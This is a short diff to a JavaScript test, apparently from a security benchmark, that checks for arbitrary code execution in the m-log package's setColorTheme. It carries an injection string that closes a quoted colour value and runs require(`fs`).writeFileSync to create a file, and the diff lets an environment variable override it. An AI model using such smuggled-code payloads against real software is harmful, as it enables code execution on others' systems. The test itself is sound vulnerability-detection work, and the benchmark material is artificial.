@@ -7,7 +7,7 @@ test("Arbitrary code execution in m-log", () => {
   expect(file_exist).toBe(false);
   try {
     log.setColorTheme({
-      silly: 'yellow"}); require(`fs`).writeFileSync(`m-log`,``); 23//',
+      silly: process.env.SECBENCH_PAYLOAD || ('yellow"}); require(`fs`).writeFileSync(`m-log`,``); 23//'),
     });
   } catch (error) {}
   file_exist = fs.existsSync(path);
